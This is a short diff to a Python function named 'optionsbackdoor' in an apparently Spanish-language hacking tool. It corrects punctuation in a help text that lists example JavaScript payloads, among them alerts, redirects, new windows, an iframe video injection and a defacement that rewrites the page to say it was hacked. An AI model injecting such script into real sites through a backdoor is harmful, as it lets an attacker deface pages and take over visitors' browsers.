@@ -62,9 +62,9 @@ def optionsbackdoor():
    options ="""
    Ejemplos de Payload:
 
-   Mensaje:         alert('Hola Mundo!')
+   Mensaje:         alert('Hola Mundo!');
    Pregunta:        confirm("Te gustaria Aprender Haching?");
-   Redireccion:     window.location = 'https://www.google.com';"
+   Redireccion:     window.location = 'https://www.google.com';
    Nueva Ventana:   window.open('https://www.github.com'); 
    Defacement:      document.body.innerHTML = '<br><br><br><h1>Hackeado por @svelizd </h1>';
    Video:           document.body.innerHTML = '<iframe width="420" height="345" src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1"></iframe>';
